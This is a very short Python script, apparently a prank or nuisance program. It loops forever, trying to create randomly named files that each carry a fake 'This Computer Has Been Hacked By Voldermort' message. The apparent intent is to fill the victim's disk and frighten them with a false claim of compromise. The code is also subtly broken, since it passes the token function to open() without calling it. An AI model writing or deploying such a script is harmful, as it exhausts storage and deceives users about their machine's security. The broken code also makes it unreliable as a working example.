import secrets
while 1:
	f = open(secrets.token_urlsafe,"w")
	f.write("""
	This Computer Has Been Hacked By Voldermort. For More Details Please Break Your Computer.
	""")
	f.close()

